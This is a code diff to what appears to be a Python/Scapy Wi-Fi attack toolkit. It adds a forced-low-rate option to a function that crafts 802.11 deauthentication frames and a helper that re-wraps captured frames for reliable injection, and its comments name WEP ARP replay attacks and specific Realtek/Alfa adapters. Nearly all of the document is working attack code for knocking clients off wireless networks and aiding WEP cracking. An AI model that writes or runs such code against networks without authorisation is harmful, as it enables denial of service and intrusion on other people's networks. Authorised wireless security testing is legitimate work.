@@ -74,10 +74,34 @@ def craft_probe_resp(
     return pkt
 
 
-def craft_deauth(bssid: str, client: str = BROADCAST, reason: int = 7) -> Packet:
-    """Craft a deauthentication frame from bssid to client (default broadcast)."""
+def craft_deauth(bssid: str, client: str = BROADCAST, reason: int = 7, low_rate: bool = False) -> Packet:
+    """Craft a deauthentication frame from bssid to client (default broadcast).
+
+    low_rate: force the RadioTap Rate field to 6 Mbps (802.11a/g OFDM;
+    RadioTap Rate units are 500kbps, so Rate=12) instead of leaving the
+    rate unset/auto. Some Realtek chipsets (e.g. RTL8814AU / Alfa
+    AWUS1900) are unreliable injecting unset-rate frames across all of
+    their antennas -- forcing the lowest common OFDM rate trades a bit
+    of airtime for delivery.
+    """
+    radiotap = RadioTap(present="Rate", Rate=12) if low_rate else RadioTap()
     dot11 = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
-    return RadioTap() / dot11 / Dot11Deauth(reason=reason)
+    return radiotap / dot11 / Dot11Deauth(reason=reason)
+
+
+def with_forced_rate(pkt: Packet, mbps: float) -> Packet:
+    """Re-wrap pkt (Dot11 onward) in a fresh RadioTap forcing the TX rate.
+
+    Replaying an already-captured frame verbatim carries its RX RadioTap
+    header, which doesn't control the rate we actually transmit at.
+    Rebuilding with an explicit low rate (RadioTap Rate is in 500kbps
+    units) trades airtime for range/reliability -- useful for WEP ARP
+    replay attacks on adapters that drop unset-rate injected frames.
+    """
+    body = pkt.getlayer(Dot11)
+    if body is None:
+        return pkt
+    return RadioTap(present="Rate", Rate=int(mbps * 2)) / body
 
 
 def _inject_radiotap() -> RadioTap:
